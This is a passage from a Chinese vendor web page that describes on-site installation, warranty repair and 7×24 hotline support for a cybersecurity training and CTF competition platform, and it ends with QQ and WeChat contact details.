<p>根据用户需求及合同规定的时间，售后技术人员将在用户现场进行项目实施，包含软硬件设备的安装、调试及验收，帮助用户顺利掌握系统，尽量减少项目实施周期，实现系统的无缝交接。</p>
<p>对由于硬件质量问题造成的硬件损坏，如在保修期内或与我方兼有相关的技术服务合同的，顶尖安全专家与安全研究员将提供现场服务，维修更换相应的硬件。对有效合同内的软件故障，用户应将故障现象及出错信息通过电邮、信件或传真等通知我们，我方根据故障等级做出不同时间级别的相应，并给予解答。不能远程解决问题时，我方将派技术人员到达用户现场进行实地解决。</p>
<p>(3)热线支持</p>
<p>顶尖安全专家与安全研究员提供全天热线技术支持，包括电子邮件、电话、传真等方式（7×24 小时）。全天热线技术支持体系，可使我们的用户最短时间内，快捷方便的得到顶尖安全专家与安全研究员的技术咨询及服务。</p>
<h1 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h1><p>QQ：1605793838</p>
<p>微信：lck13367528958</p>
]]></content>
      <categories>
        <category>products</category>
      </categories>
      <tags>
        <tag>CTF平台</tag>
        <tag>网络安全实训平台</tag>
        <tag>攻防竞赛平台</tag>
        <tag>AWD平台</tag>
      </tags>
  </entry>
</search>
